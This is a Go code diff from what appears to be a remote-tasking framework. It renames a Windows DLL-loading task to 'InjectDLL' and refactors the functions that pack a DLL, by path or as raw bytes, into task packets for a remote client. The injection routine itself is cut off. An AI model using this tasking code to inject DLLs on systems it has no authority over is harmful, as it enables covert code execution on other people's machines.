@@ -13,8 +13,8 @@ import (
 	"github.com/iDigitalFlame/xmt/device"
 )
 
-// DLLTask is a Windows specific task that relates to loading a DLL into a process.
-const DLLTask = dllTasker(0xC5)
+// InjectDLL is a Windows specific task that relates to loading a DLL into a process.
+const InjectDLL = dllTasker(0xC5)
 
 // DLL is a struct that is similar to the 'cmd.DLL' struct. This is used to Task a Client with loading a DLL
 // on Windows devices. This struct has many of the functionallies of the standard 'cmd.DLL' function. The
@@ -33,32 +33,10 @@ type dllTasker uint8
 func (dllTasker) Thread() bool {
 	return false
 }
-
-// LoadDLL is a function that will generate a Task packet for loading a DLL from the specified Reader.
-// This will read the data and pack it into the Packet to be downloaded onto the host.
-func LoadDLL(r io.Reader) (*com.Packet, error) {
-	var b bytes.Buffer
-	if _, err := io.Copy(&b, r); err != nil {
-		return nil, err
-	}
-	var (
-		p = &com.Packet{ID: uint8(DLLTask)}
-		d = DLL{Data: b.Bytes()}
-	)
-	d.MarshalStream(p)
-	return p, nil
-}
-
-// LoadDLLFile is a function that will generate a Task packet for loading a DLL from the specified local
-// file path. This will read the file and pack it into the Packet to be downloaded onto the host.
-func LoadDLLFile(s string) (*com.Packet, error) {
-	f, err := os.OpenFile(device.Expand(s), os.O_RDONLY, 0)
-	if err != nil {
-		return nil, err
-	}
-	p, err := LoadDLL(f)
-	f.Close()
-	return p, err
+func (dllTasker) Local(s string) *com.Packet {
+	p := &com.Packet{ID: uint8(InjectDLL)}
+	(DLL{Path: s}).MarshalStream(p)
+	return p
 }
 
 // MarshalStream writes the data for this DLL task to the supplied Writer.
@@ -99,6 +77,28 @@ func (d *DLL) UnmarshalStream(r data.Reader) error {
 		return err
 	}
 	return nil
+}
+
+func (dllTasker) FromFile(s string) (*com.Packet, error) {
+	f, err := os.OpenFile(device.Expand(s), os.O_RDONLY, 0)
+	if err != nil {
+		return nil, err
+	}
+	p, err := InjectDLL.FromReader(f)
+	f.Close()
+	return p, err
+}
+func (dllTasker) FromReader(r io.Reader) (*com.Packet, error) {
+	var b bytes.Buffer
+	if _, err := io.Copy(&b, r); err != nil {
+		return nil, err
+	}
+	var (
+		p = &com.Packet{ID: uint8(InjectDLL)}
+		d = DLL{Data: b.Bytes()}
+	)
+	d.MarshalStream(p)
+	return p, nil
 }
 func (dllTasker) Do(x context.Context, p *com.Packet) (*com.Packet, error) {
 	var d DLL
